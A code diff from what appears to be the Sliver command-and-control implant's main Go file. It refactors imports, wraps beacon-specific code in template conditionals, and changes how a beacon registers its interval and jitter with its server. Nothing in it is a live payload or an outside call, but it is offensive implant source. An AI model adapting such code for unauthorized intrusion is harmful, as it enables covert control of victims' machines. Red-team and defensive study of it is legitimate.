@@ -25,20 +25,23 @@ import "C"
 // {{end}}
 
 import (
+	"log"
 	"os"
 	"os/user"
 	"runtime"
+
+	// {{if .Config.IsBeacon}}
 	"sync"
+
+	"github.com/gofrs/uuid"
+
+	// {{end}}
+
 	"time"
 
 	// {{if .Config.Debug}}{{else}}
 	"io/ioutil"
 	// {{end}}
-
-	"log"
-
-	"github.com/bishopfox/sliver/protobuf/sliverpb"
-	"github.com/gofrs/uuid"
 
 	// {{if eq .Config.GOOS "windows"}}
 	"github.com/bishopfox/sliver/implant/sliver/priv"
@@ -53,6 +56,7 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/pivots"
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/implant/sliver/version"
+	"github.com/bishopfox/sliver/protobuf/sliverpb"
 
 	"google.golang.org/protobuf/proto"
 	"google.golang.org/protobuf/reflect/protoreflect"
@@ -75,7 +79,7 @@ func init() {
 	BeaconID = id.String()
 }
 
-//{{end}}
+// {{end}}
 
 // {{if .Config.IsService}}
 
@@ -186,6 +190,7 @@ func main() {
 	// {{end}}
 }
 
+// {{if .Config.IsBeacon}}
 func beaconMainLoop(beacon *transports.Beacon) {
 	// Register beacon
 	err := beacon.Start()
@@ -199,11 +204,9 @@ func beaconMainLoop(beacon *transports.Beacon) {
 	log.Printf("Registering beacon with server")
 	// {{end}}
 	beacon.Send(Envelope(&sliverpb.BeaconRegister{
-		ID: BeaconID,
-		Duration: &sliverpb.BeaconDuration{
-			Interval: beacon.Interval,
-			Jitter:   beacon.Jitter,
-		},
+		ID:       BeaconID,
+		Interval: beacon.Interval,
+		Jitter:   beacon.Jitter,
 		Register: RegisterSliver(),
 	}))
 	beacon.Close()
@@ -283,6 +286,8 @@ func beaconMain(beacon *transports.Beacon) error {
 	beacon.Close()
 	return nil
 }
+
+// {{end}} -IsBeacon
 
 func sessionMainLoop(connection *transports.Connection) {
 	// Reconnect active pivots
